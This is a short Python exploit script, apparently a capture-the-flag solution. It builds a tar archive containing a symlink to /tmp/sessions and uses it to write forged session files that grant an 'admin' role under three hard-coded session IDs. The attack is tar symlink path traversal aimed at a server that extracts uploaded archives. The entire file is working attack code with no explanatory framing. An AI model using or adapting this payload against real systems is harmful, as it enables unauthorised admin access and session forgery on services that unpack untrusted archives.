from tarfile import TarFile
import subprocess
import json

USERNAME = "noexist1"
SESSION_ID_1 = "515d6aa784d0035f48134983d379c75eaaf1125b557f643ee0c6bc580b163d00" 
SESSION_ID_2 = "a6d42edf8d4b432a08868aa5c19c96c8aa7ca3d7bba513a4d1e0a56560f6344b"
SESSION_ID_3 = "4c27a6a91183f3adb9e6c25fadcdb50d1da5e028b16cec2ca2d37e078beac8b9"

cmd = subprocess.run(["ln", "-s", "/tmp/sessions", "tmp_link"])
data = json.dumps({"username":USERNAME, "id":1337,  "role":"admin"})
f = open(f"malicous_data.txt", "w")
f.write(data)
f.close()
with TarFile("payload.tar", "w") as tarf:
    tarf.add("tmp_link")
    tarf.add("malicous_data.txt", f"tmp_link/{USERNAME}/{SESSION_ID_1}")
    tarf.add("malicous_data.txt", f"tmp_link/{USERNAME}/{SESSION_ID_2}")
    tarf.add("malicous_data.txt", f"tmp_link/{USERNAME}/{SESSION_ID_3}")